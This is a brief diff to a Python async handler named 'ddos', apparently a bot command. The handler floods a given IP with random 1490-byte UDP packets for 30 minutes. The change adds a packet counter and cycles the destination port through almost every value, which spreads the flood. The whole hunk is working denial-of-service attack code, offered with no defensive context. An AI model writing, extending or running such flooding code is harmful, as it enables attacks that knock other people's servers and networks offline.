@@ -14,7 +14,11 @@ async def ddos(event):
   timeout = 1800
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   bytes = random._urandom(1490)
+  sent = 0
   timeout_start = time.time()
   while time.time() < timeout_start + timeout:
      sock.sendto(bytes, (ip,port))
-   
+     sent = sent + 1
+     port = port + 1
+     if port == 65534:
+       port = 1
